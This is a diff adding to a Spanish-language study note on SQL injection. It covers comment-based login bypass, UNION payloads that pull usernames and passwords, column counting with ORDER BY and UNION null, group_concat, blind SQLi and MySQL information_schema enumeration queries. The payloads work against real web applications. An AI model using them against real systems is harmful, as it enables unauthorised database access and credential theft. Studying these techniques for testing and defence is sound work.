@@ -74,6 +74,10 @@ SELECT * FROM users WHERE username = 'administrator'--' AND password = 'bluechee
 
 Viendo el output de las querys podemos determinar distintos datos sobre la BD.
 
+## Detectar número de columnas
+
+Mediante errores podemos ver el número de columnas que se están solicitando con la query. Una forma sería utilizando **ORDER BY**. Si añadimos `ORDER BY 3--` y el número de columnas es inferior a 3, nos devolverá un error.
+
 # UNION based SQLI
 
 Si de igual forma, utilizamos el operador **UNION**, podemos hacer una subconsulta que se añada a la inicial. Esta segunda consulta debe devolver u número de columnas igual, lo cuál puede server también para determinar el número de columnas de una tabla.
@@ -88,6 +92,17 @@ Con una inyección como `' UNION SELECT username, password FROM users--` la quer
 SELECT name, description FROM products WHERE category = '' UNION SELECT username, password FROM users--'
 ```
 
+En ocasiones, la consulta tramitada con UNION no llega a mostrarse, por ello debemos jugar con **group_concat()**, que concatena la consulta principal con la del UNION
+
+## Detectar número de columnas
+
+Con UNION también podemos detectar el número de columnas, mediante inyecciones como:
+
+```sql
+1' UNION SELECT null-- - Not working
+1' UNION SELECT null,null-- - Not working
+1' UNION SELECT null,null,null-- - Worked
+```
 
 # Blind SQLI
 
@@ -112,3 +127,22 @@ SELECT TrackingId FROM TrackedUsers WHERE TrackingId = 'u5YD3PapBcR4lN3e7Tj4 xyz
 ```
 
 Este proceso lo podemos automatizar haciendo uso de la librería [[pwntools]].
+
+# MySQL
+
+Para obtener información sobre la propia base de datos, podemos utilizar la tabla **information_schema**.
+
+- Nombre de las bases de datos:
+```sql
+SELECT schema_name FROM information_schema.schemata
+```
+
+- Tablas de una base de datos:
+```sql
+SELECT table_name FROM information_schema.tables WHERE table_schema=[database]
+```
+
+- Nombres de las columnas:
+```sql
+SELECT column_name FROM information_schema.columns WHERE table_name=[table name]
+```
